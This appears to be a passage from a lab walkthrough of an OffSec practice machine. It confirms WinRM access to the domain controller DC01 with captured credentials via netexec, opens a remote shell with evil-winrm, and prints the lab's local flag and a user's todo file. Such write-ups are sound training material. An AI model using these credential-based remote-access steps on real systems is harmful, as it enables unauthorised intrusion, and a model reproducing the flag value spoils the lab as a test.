On the web app in [[8080 HTTP(S)]], we get a 200 response code on http://192.168.247.165:5985/wsman, confirming the WinRM is accessible internally, but we'll need credentials to do anything.

:47001 is the same thing but only open on the target's localhost.
https://morgansimonsen.com/2009/12/10/winrm-and-tcp-ports/

![[Pasted image 20250803122117.png]]

# With enox:california credentials

`netexec winrm DC01.heist.offsec -u enox -p california`

```
WINRM       192.168.109.165 5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:heist.offsec)
WINRM       192.168.109.165 5985   DC01             [+] heist.offsec\enox:california (Pwn3d!)
```

Pwn3d! indicates we have remote access via winrm. We'll continue using evil-winrm:

## Exploitation with evil-winrm

`evil-winrm -i DC01.heist.offsec -u enox -p california`

Just like that, we have a shell! I'm actually going to exit, make a directory named `scripts`, a copy [SauronEye](https://github.com/vivami/SauronEye/releases) into it, to easily transfer to the host. 
This utility will allow us to find .txt files very quickly, including the local flag.

![[Pasted image 20250805181329.png]]
`type C:\Users\enox\Desktop\local.txt`

`9de76564847d8624b14b7595604ba7fd`

`C:\Users\enox\Desktop\todo.txt` also looks interesting:

```
- Setup Flask Application for Secure Browser [DONE]
- Use group managed service account for apache [DONE]
- Migrate to apache
- Debug Flask Application [DONE]
- Remove Flask Application
- Submit IT Expenses file to admin. [DONE]
```

Next I'll begin enumeration for privilege escalation in [[Enox -> svc_apache$]].

